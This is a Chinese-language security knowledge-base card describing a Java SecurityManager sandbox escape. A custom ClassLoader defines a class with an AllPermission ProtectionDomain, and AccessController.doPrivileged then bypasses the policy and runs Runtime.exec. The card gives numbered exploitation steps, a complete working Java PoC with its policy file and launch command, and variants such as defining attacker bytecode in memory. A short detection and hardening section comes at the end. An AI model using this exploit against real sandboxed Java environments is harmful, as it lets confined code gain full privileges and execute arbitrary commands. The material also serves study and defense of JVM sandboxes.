---
id: binary-pwn-sandbox-escape-classloader-allpermission-doprivileged
title: 自定义 ClassLoader 造 AllPermission 的 ProtectionDomain + doPrivileged 越过策略
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: classloader-allpermission-protectiondomain-privileged-action
aliases:
- 自定义 ClassLoader 逃逸沙箱
- defineClass 带 AllPermission ProtectionDomain
- doPrivileged 扩权
- CodeSource 空 全权限
- ClassLoader 绕过 SecurityManager
tags:
- java
- sandbox-escape
- securitymanager
- classloader
- protectiondomain
- allpermission
- doprivileged
- accesscontroller
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:38:58+08:00'
  notes: 已对照原文核对：原文「自定义 ClassLoader 在 defineClass 时设置 ProtectionDomain」「权限仅限当前栈帧、需借 doPrivileged 扩展」「my.policy 授 createClassLoader + FilePermission <<ALL FILES>> read」「poc 用 Class.forName(Exp,true,mcl)、Exp 静态块里 doPrivileged 执行 exec、MyClassLoader 重写 loadClass 对 Exploit 走 findClass、defineClazz 里 Permissions+AllPermission+ProtectionDomain」与卡内数据流、PoC、策略块一致；原文备注「需要重写 loadClass()」与卡内变体第一条一致。卡内另注 CodeSource/defineClass 语义与 JDK 版本边界并标 confidence=medium，处理合理。未验证点：未在 JDK8 复跑；原文 loadClass 判断用 name.contains(Exploit) 与卡内示例用 contains(Exp) 的差异属示例化改写，未改变语义。
---

## 一句话结论

类的 `ProtectionDomain` 在 `defineClass` 时由 ClassLoader 决定，而 SecurityManager 的权限判定只看栈上各帧类的域：若策略授予了 `createClassLoader`（很多沙箱必须给，否则加载不了插件），沙箱内代码就能自建一个 ClassLoader，把恶意类 `defineClass` 时绑定到一个 `PermissionCollection` 里含 `AllPermission` 的 `ProtectionDomain`；再在恶意类里用 `AccessController.doPrivileged(...)` 让检查只走到这一帧为止，从而在 `exec` 等操作上绕过策略限制。

## 原理

- `ClassLoader.defineClass(name, bytes, off, len, ProtectionDomain)` 允许调用方显式传入域；域的权限集合由调用方构造（`Permissions pc = new Permissions(); pc.add(new AllPermission())`）。因此「类拥有什么权限」不是由 policy 文件唯一决定的——只要有加载类的权限，就能给新类签发任意权限。
- `AccessController` 检查时沿栈向上，遇到「域含 AllPermission」的帧会短路；但**单纯让恶意类拥有 AllPermission 并不够**：检查仍会继续向上检查调用它的帧（`Runtime.exec` 的调用者链里往往有来自应用类加载器的帧，受 policy 约束）。
- `doPrivileged(PrivilegedAction)` 的作用是「截断栈」：检查只到执行 `doPrivileged` 的这一帧为止，不再向上检查。把「拥有 AllPermission 的类」+「在其中调用 doPrivileged」组合起来，检查在第一帧就通过、且不再向上，策略限制被完全绕过。
- 为什么策略里 `createClassLoader` 是关键前提：没有它，`new ClassLoader()` 这步就被 `checkCreateClassLoader` 拒绝。很多沙箱（插件/脚本框架）为了业务必须开这条权限，于是形成「给加载类的能力 = 给签发权限的能力」的隐性越权。
- 与「反射改 hasAllPerm」的差别：本卡不碰已有域，而是新造一个域并让代码在其下运行，隐蔽性更好（原域权限集合未被修改）；但仍需 `doPrivileged` 来隔断上层帧，否则上层受限帧仍会让检查失败。
- 实现细节：`loadClass` 要重写才能在 `Class.forName(name, true, loader)` 时走自定义加载器（只重写 `findClass` 而 `loadClass` 仍走父加载器时，类会由系统加载器定义、拿不到自定义域）；`CodeSource` 可传 `null`/空证书。

## 触发条件

- JVM 启用 SecurityManager，且策略授予 `java.lang.RuntimePermission "createClassLoader"`（或等价宽泛授权）。
- 策略同时允许读取要加载的 `.class` 文件（`FilePermission ... "read"`）或字节码已由攻击者提供。
- 目标 JDK 的 `defineClass(..., ProtectionDomain)` 语义未变（JDK 8 系列成立；高版本模块封装会影响反射/内部 API，但本路径用的是公开 API）。
- 攻击者能在该 JVM 内执行任意 Java 代码。

## 利用步骤

1. 确认策略含 `createClassLoader`（读 policy 文件或尝试 `new ClassLoader(){}` 是否被拒）。
2. 准备恶意类（如 `Exp`），其静态块/构造器里用 `AccessController.doPrivileged` 包裹真正的危险操作。
3. 编写自定义 `ClassLoader`：重写 `loadClass`（对目标类名走自己的 `findClass`，其余委派父加载器），在 `findClass` 里读字节并 `defineClass(name, bytes, 0, len, pd)`，其中 `pd = new ProtectionDomain(codeSource, pcWithAllPermission, this, null)`。
4. 用 `Class.forName("Exp", true, myLoader)` 加载并 `newInstance()` 触发静态块。
5. `doPrivileged` 内执行 `Runtime.getRuntime().exec(...)`；验证命令执行（弹窗/写文件），确认策略的 execute 限制未生效。

## PoC

```java
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.channels.*;
import java.security.*;

public class poc {
    public static void main(String[] args) throws Exception {
        MyClassLoader mcl = new MyClassLoader();
        Class<?> c = Class.forName("Exp", true, mcl);
        Object obj = c.newInstance();
        System.out.println(obj.getClass().getClassLoader());
    }
}

class Exp {
    static {
        AccessController.doPrivileged(new PrivilegedAction<Object>() {
            public Object run() {
                try {
                    Runtime.getRuntime().exec("calc");
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return null;
            }
        });
    }
}

class MyClassLoader extends ClassLoader {
    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        if (name.contains("Exp")) {
            return findClass(name);       // 目标类走自定义加载，不被父加载器抢走
        }
        return super.loadClass(name);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] bytes = readClassBytes("./" + name + ".class");
        return defineClazz(name, bytes, 0, bytes.length);
    }

    protected final Class<?> defineClazz(String name, byte[] b, int off, int len) {
        PermissionCollection pc = new Permissions();
        pc.add(new AllPermission());     // 给新类签发全权限
        ProtectionDomain pd = new ProtectionDomain(
                new CodeSource(null, (java.security.cert.Certificate[]) null), pc, this, null);
        pc.setReadOnly();
        return defineClass(name, b, off, len, pd);
    }

    private byte[] readClassBytes(String path) {
        try (FileInputStream fis = new FileInputStream(path);
             FileChannel fc = fis.getChannel();
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             WritableByteChannel wbc = Channels.newChannel(baos)) {
            ByteBuffer buf = ByteBuffer.allocate(1024);
            while (fc.read(buf) > 0) { buf.flip(); wbc.write(buf); buf.clear(); }
            return baos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

```text
# 策略：只给加载类与读文件的权限，故意不给 execute
grant {
    permission java.lang.RuntimePermission "createClassLoader";
    permission java.io.FilePermission "<<ALL FILES>>", "read";
};
```

```bash
java -Djava.security.manager -Djava.security.policy="my.policy" poc
```

## 变体与关联

- 变体：不重写 `loadClass` 只重写 `findClass` 时，`Class.forName(..., loader)` 仍可能被父加载器优先命中，导致类拿到系统域、`AllPermission` 不生效——这是多数人照抄 PoC 失败的主要原因，必须走 `loadClass` 分流。
- 变体：把恶意操作放在 `static {}` 里可保证 `Class.forName(name, true, loader)` 触发初始化即执行，无需显式调用方法。
- 变体：若无法读本地 class 文件，可直接在内存里用攻击者提供的字节码（Base64 解码）定义类。
- 关联：`[[binary-pwn-sandbox-escape-protectiondomain-hasallperm-reflection]]` 是改既有域的标志，本卡是新建域 + 截断栈；`[[web-java-classloader-jsp-memory-servlet-webshell]]` 用同类自定义 ClassLoader 做内存马（那里目标是绕过容器路由/文件检测，不是 SecurityManager）。
- 边界：策略不给 `createClassLoader`、`defineClass` 版本差异导致域未生效、没有 `doPrivileged` 隔断上层帧、JDK 高版本模块/内部 API 限制时失败（置信度 medium）。

## 检测与防御

- 检测：运行期出现自定义 `ClassLoader` 子类且其 `defineClass` 传入自造 `ProtectionDomain`；`AllPermission` 在非系统类加载器上被授予；沙箱进程内 `doPrivileged` 与 `Runtime.exec` 紧邻出现。
- 修复：策略中撤销不必要的 `createClassLoader`；必须开时，用独立的、受限的类加载器体系并对 `defineClass` 传入的域做校验（拒绝 `AllPermission`）。
- 加固：用 `sun.reflect.Reflection.registerMethodsToFilter` 之外的机制限制 `AccessController.doPrivileged` 的滥用；把隔离下沉到操作系统层（低权限账号 + seccomp/AppArmor），不把 JVM 内 SecurityManager 当唯一边界。
